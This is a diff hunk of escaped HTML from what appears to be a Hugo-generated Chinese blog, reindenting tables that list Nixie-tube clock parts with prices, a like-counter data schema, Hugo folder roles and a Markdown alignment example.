-  &lt;tbody&gt;
-      &lt;tr&gt;
-          &lt;td&gt;IN-14辉光管&lt;/td&gt;
-          &lt;td&gt;显示数字&lt;/td&gt;
-          &lt;td&gt;8&lt;/td&gt;
-          &lt;td&gt;600&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;STC15F2K60S2&lt;/td&gt;
-          &lt;td&gt;单片机&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;5&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;TD62083AFNG&lt;/td&gt;
-          &lt;td&gt;高电压驱动芯片&lt;/td&gt;
-          &lt;td&gt;11&lt;/td&gt;
-          &lt;td&gt;15&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;WS2812B&lt;/td&gt;
-          &lt;td&gt;彩灯&lt;/td&gt;
-          &lt;td&gt;8&lt;/td&gt;
-          &lt;td&gt;3&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;CR1220-2&lt;/td&gt;
-          &lt;td&gt;时钟模块供电&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;3&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;DS3231&lt;/td&gt;
-          &lt;td&gt;计时&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;5&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;DS18B20&lt;/td&gt;
-          &lt;td&gt;温度传感器&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;74H595PW&lt;/td&gt;
-          &lt;td&gt;移位寄存器&lt;/td&gt;
-          &lt;td&gt;11&lt;/td&gt;
-          &lt;td&gt;4.5&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;VS1838B&lt;/td&gt;
-          &lt;td&gt;红外接收器&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;大电容&lt;/td&gt;
-          &lt;td&gt;作为按键&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;2&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;bs818A&lt;/td&gt;
-          &lt;td&gt;按键电容芯片&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;2&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;CH340&lt;/td&gt;
-          &lt;td&gt;烧录程序&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;4&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;锂电池&lt;/td&gt;
-          &lt;td&gt;供电&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;13&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;UPS模块&lt;/td&gt;
-          &lt;td&gt;锂电池充放电&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;5&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;辉光管升压模块&lt;/td&gt;
-          &lt;td&gt;5v升170v&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;47&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;端子线&lt;/td&gt;
-          &lt;td&gt;连接ups等模块&lt;/td&gt;
-          &lt;td&gt;7&lt;/td&gt;
-          &lt;td&gt;6&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;电源按键&lt;/td&gt;
-          &lt;td&gt;开关&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;5&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;旋转编码器&lt;/td&gt;
-          &lt;td&gt;调节时间&lt;/td&gt;
-          &lt;td&gt;2&lt;/td&gt;
-          &lt;td&gt;4&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;m2*3螺丝&lt;/td&gt;
-          &lt;td&gt;固定&lt;/td&gt;
-          &lt;td&gt;50&lt;/td&gt;
-          &lt;td&gt;2.5&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;m2*6+4不锈钢螺柱&lt;/td&gt;
-          &lt;td&gt;固定&lt;/td&gt;
-          &lt;td&gt;6&lt;/td&gt;
-          &lt;td&gt;1。5&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;usbc母座&lt;/td&gt;
-          &lt;td&gt;充电&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;1.5&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;红外遥控器&lt;/td&gt;
-          &lt;td&gt;遥控&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;3&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;电路板&lt;/td&gt;
-          &lt;td&gt;可以吃&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;0&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;外壳&lt;/td&gt;
-          &lt;td&gt;可以吃&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;170&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;25p&lt;/td&gt;
-          &lt;td&gt;电容&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;10n&lt;/td&gt;
-          &lt;td&gt;电容&lt;/td&gt;
-          &lt;td&gt;4&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;1u&lt;/td&gt;
-          &lt;td&gt;电容&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;0.1u&lt;/td&gt;
-          &lt;td&gt;电容&lt;/td&gt;
-          &lt;td&gt;3&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;10k&lt;/td&gt;
-          &lt;td&gt;电阻&lt;/td&gt;
-          &lt;td&gt;7&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;4.7k&lt;/td&gt;
-          &lt;td&gt;电阻&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;20k&lt;/td&gt;
-          &lt;td&gt;电阻&lt;/td&gt;
-          &lt;td&gt;8&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;5*7直插电解电容&lt;/td&gt;
-          &lt;td&gt;装饰元器件&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;0&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;5*11直插电解电容&lt;/td&gt;
-          &lt;td&gt;装饰元器件&lt;/td&gt;
-          &lt;td&gt;8&lt;/td&gt;
-          &lt;td&gt;3&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;独石电容&lt;/td&gt;
-          &lt;td&gt;装饰元器件&lt;/td&gt;
-          &lt;td&gt;5&lt;/td&gt;
-          &lt;td&gt;2.5&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;1/4w五色环电阻&lt;/td&gt;
-          &lt;td&gt;装饰元器件&lt;/td&gt;
-          &lt;td&gt;5&lt;/td&gt;
-          &lt;td&gt;0&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;碳膜电阻&lt;/td&gt;
-          &lt;td&gt;装饰元器件&lt;/td&gt;
-          &lt;td&gt;8&lt;/td&gt;
-          &lt;td&gt;0&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;整流二极管&lt;/td&gt;
-          &lt;td&gt;装饰元器件&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;1.5&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;dip-8芯片&lt;/td&gt;
-          &lt;td&gt;装饰元器件&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;0.5&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;dip-16芯片&lt;/td&gt;
-          &lt;td&gt;装饰元器件&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-          &lt;td&gt;1&lt;/td&gt;
-      &lt;/tr&gt;
-  &lt;/tbody&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;名称&lt;/th&gt;
+					&lt;th&gt;作用&lt;/th&gt;
+					&lt;th&gt;数量&lt;/th&gt;
+					&lt;th&gt;价格&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;IN-14辉光管&lt;/td&gt;
+					&lt;td&gt;显示数字&lt;/td&gt;
+					&lt;td&gt;8&lt;/td&gt;
+					&lt;td&gt;600&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;STC15F2K60S2&lt;/td&gt;
+					&lt;td&gt;单片机&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;TD62083AFNG&lt;/td&gt;
+					&lt;td&gt;高电压驱动芯片&lt;/td&gt;
+					&lt;td&gt;11&lt;/td&gt;
+					&lt;td&gt;15&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;WS2812B&lt;/td&gt;
+					&lt;td&gt;彩灯&lt;/td&gt;
+					&lt;td&gt;8&lt;/td&gt;
+					&lt;td&gt;3&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CR1220-2&lt;/td&gt;
+					&lt;td&gt;时钟模块供电&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;3&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;DS3231&lt;/td&gt;
+					&lt;td&gt;计时&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;DS18B20&lt;/td&gt;
+					&lt;td&gt;温度传感器&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;74H595PW&lt;/td&gt;
+					&lt;td&gt;移位寄存器&lt;/td&gt;
+					&lt;td&gt;11&lt;/td&gt;
+					&lt;td&gt;4.5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;VS1838B&lt;/td&gt;
+					&lt;td&gt;红外接收器&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;大电容&lt;/td&gt;
+					&lt;td&gt;作为按键&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;2&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;bs818A&lt;/td&gt;
+					&lt;td&gt;按键电容芯片&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;2&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;CH340&lt;/td&gt;
+					&lt;td&gt;烧录程序&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;锂电池&lt;/td&gt;
+					&lt;td&gt;供电&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;13&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;UPS模块&lt;/td&gt;
+					&lt;td&gt;锂电池充放电&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;辉光管升压模块&lt;/td&gt;
+					&lt;td&gt;5v升170v&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;47&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;端子线&lt;/td&gt;
+					&lt;td&gt;连接ups等模块&lt;/td&gt;
+					&lt;td&gt;7&lt;/td&gt;
+					&lt;td&gt;6&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;电源按键&lt;/td&gt;
+					&lt;td&gt;开关&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;旋转编码器&lt;/td&gt;
+					&lt;td&gt;调节时间&lt;/td&gt;
+					&lt;td&gt;2&lt;/td&gt;
+					&lt;td&gt;4&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;m2*3螺丝&lt;/td&gt;
+					&lt;td&gt;固定&lt;/td&gt;
+					&lt;td&gt;50&lt;/td&gt;
+					&lt;td&gt;2.5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;m2*6+4不锈钢螺柱&lt;/td&gt;
+					&lt;td&gt;固定&lt;/td&gt;
+					&lt;td&gt;6&lt;/td&gt;
+					&lt;td&gt;1。5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;usbc母座&lt;/td&gt;
+					&lt;td&gt;充电&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;1.5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;红外遥控器&lt;/td&gt;
+					&lt;td&gt;遥控&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;3&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;电路板&lt;/td&gt;
+					&lt;td&gt;可以吃&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;0&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;外壳&lt;/td&gt;
+					&lt;td&gt;可以吃&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;170&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;25p&lt;/td&gt;
+					&lt;td&gt;电容&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;10n&lt;/td&gt;
+					&lt;td&gt;电容&lt;/td&gt;
+					&lt;td&gt;4&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;1u&lt;/td&gt;
+					&lt;td&gt;电容&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;0.1u&lt;/td&gt;
+					&lt;td&gt;电容&lt;/td&gt;
+					&lt;td&gt;3&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;10k&lt;/td&gt;
+					&lt;td&gt;电阻&lt;/td&gt;
+					&lt;td&gt;7&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;4.7k&lt;/td&gt;
+					&lt;td&gt;电阻&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;20k&lt;/td&gt;
+					&lt;td&gt;电阻&lt;/td&gt;
+					&lt;td&gt;8&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;5*7直插电解电容&lt;/td&gt;
+					&lt;td&gt;装饰元器件&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;0&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;5*11直插电解电容&lt;/td&gt;
+					&lt;td&gt;装饰元器件&lt;/td&gt;
+					&lt;td&gt;8&lt;/td&gt;
+					&lt;td&gt;3&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;独石电容&lt;/td&gt;
+					&lt;td&gt;装饰元器件&lt;/td&gt;
+					&lt;td&gt;5&lt;/td&gt;
+					&lt;td&gt;2.5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;1/4w五色环电阻&lt;/td&gt;
+					&lt;td&gt;装饰元器件&lt;/td&gt;
+					&lt;td&gt;5&lt;/td&gt;
+					&lt;td&gt;0&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;碳膜电阻&lt;/td&gt;
+					&lt;td&gt;装饰元器件&lt;/td&gt;
+					&lt;td&gt;8&lt;/td&gt;
+					&lt;td&gt;0&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;整流二极管&lt;/td&gt;
+					&lt;td&gt;装饰元器件&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;1.5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;dip-8芯片&lt;/td&gt;
+					&lt;td&gt;装饰元器件&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;0.5&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;dip-16芯片&lt;/td&gt;
+					&lt;td&gt;装饰元器件&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+					&lt;td&gt;1&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
 &lt;/table&gt;
 &lt;h2 id=&#34;制作过程&#34;&gt;制作过程
 &lt;/h2&gt;&lt;h3 id=&#34;定制&#34;&gt;定制
@@ -16026,25 +16615,25 @@ ESP32 GND ↔ 降压模块2 GND ↔ 舵机 GND（共地）&lt;/p&gt;
 &lt;p&gt;点击&lt;code&gt;Like&amp;gt;添加列&lt;/code&gt;&lt;/p&gt;
 &lt;img src=&#34;hugon5.png&#34; style=&#34;width: 90%;&#34; /&gt;
 &lt;table&gt;
-  &lt;thead&gt;
-      &lt;tr&gt;
-          &lt;th&gt;字段名&lt;/th&gt;
-          &lt;th&gt;类型&lt;/th&gt;
-          &lt;th&gt;描述&lt;/th&gt;
-      &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;path&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;String&lt;/td&gt;
-          &lt;td&gt;页面唯一路径&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;count&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;Number&lt;/td&gt;
-          &lt;td&gt;点赞数量&lt;/td&gt;
-      &lt;/tr&gt;
-  &lt;/tbody&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;字段名&lt;/th&gt;
+					&lt;th&gt;类型&lt;/th&gt;
+					&lt;th&gt;描述&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;path&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;String&lt;/td&gt;
+					&lt;td&gt;页面唯一路径&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;count&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;Number&lt;/td&gt;
+					&lt;td&gt;点赞数量&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
 &lt;/table&gt;
 &lt;p&gt;点击左下角&lt;code&gt;设置&amp;gt;应用凭证&lt;/code&gt;，记录自己的&lt;code&gt;AppID&lt;/code&gt;，&lt;code&gt;AppKey&lt;/code&gt;，&lt;code&gt;API 服务器地址&lt;/code&gt;&lt;/p&gt;
 &lt;img src=&#34;hugon6.png&#34; style=&#34;width: 40%;&#34; /&gt;
@@ -18099,38 +18688,38 @@ ESP32 GND ↔ 降压模块2 GND ↔ 舵机 GND（共地）&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;h3 id=&#34;主要文件夹&#34;&gt;主要文件夹
 &lt;/h3&gt;&lt;table&gt;
-  &lt;thead&gt;
-      &lt;tr&gt;
-          &lt;th&gt;文件夹&lt;/th&gt;
-          &lt;th&gt;功能描述&lt;/th&gt;
-      &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;assets&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;放置图标、JS 脚本、CSS 样式等资源&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;content&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;存放文章与页面，如博客、分类、归档等&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;layouts&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;页面结构与布局模板&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;public&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;Hugo 编译输出目录，不建议手动修改&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;static&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;静态文件，如图片等，会直接映射到根路径&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td&gt;&lt;code&gt;themes&lt;/code&gt;&lt;/td&gt;
-          &lt;td&gt;主题文件夹&lt;/td&gt;
-      &lt;/tr&gt;
-  &lt;/tbody&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;文件夹&lt;/th&gt;
+					&lt;th&gt;功能描述&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;assets&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;放置图标、JS 脚本、CSS 样式等资源&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;content&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;存放文章与页面，如博客、分类、归档等&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;layouts&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;页面结构与布局模板&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;public&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;Hugo 编译输出目录，不建议手动修改&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;static&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;静态文件，如图片等，会直接映射到根路径&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;code&gt;themes&lt;/code&gt;&lt;/td&gt;
+					&lt;td&gt;主题文件夹&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
 &lt;/table&gt;
 &lt;p&gt;&lt;code&gt;content&lt;/code&gt;文件夹中：&lt;/p&gt;
 &lt;ul&gt;
@@ -18646,20 +19235,20 @@ $$&lt;h4 id=&#34;行内数学公式&#34;&gt;行内数学公式
 &lt;li&gt;&lt;code&gt;:---:&lt;/code&gt; 表示居中对齐&lt;/li&gt;
 &lt;/ul&gt;
 &lt;table&gt;
-  &lt;thead&gt;
-      &lt;tr&gt;
-          &lt;th style=&#34;text-align: left&#34;&gt;左对齐&lt;/th&gt;
-          &lt;th style=&#34;text-align: right&#34;&gt;右对齐&lt;/th&gt;
-          &lt;th style=&#34;text-align: center&#34;&gt;居中对齐&lt;/th&gt;
-      &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-      &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;abc&lt;/td&gt;
-          &lt;td style=&#34;text-align: right&#34;&gt;123&lt;/td&gt;
-          &lt;td style=&#34;text-align: center&#34;&gt;中间&lt;/td&gt;
-      &lt;/tr&gt;
-  &lt;/tbody&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th style=&#34;text-align: left&#34;&gt;左对齐&lt;/th&gt;
+					&lt;th style=&#34;text-align: right&#34;&gt;右对齐&lt;/th&gt;
+					&lt;th style=&#34;text-align: center&#34;&gt;居中对齐&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;abc&lt;/td&gt;
+					&lt;td style=&#34;text-align: right&#34;&gt;123&lt;/td&gt;
+					&lt;td style=&#34;text-align: center&#34;&gt;中间&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
 &lt;/table&gt;
 &lt;h3 id=&#34;脚注&#34;&gt;脚注
 &lt;/h3&gt;&lt;p&gt;&lt;code&gt;脚注示例[^1]&lt;/code&gt;&lt;/p&gt;
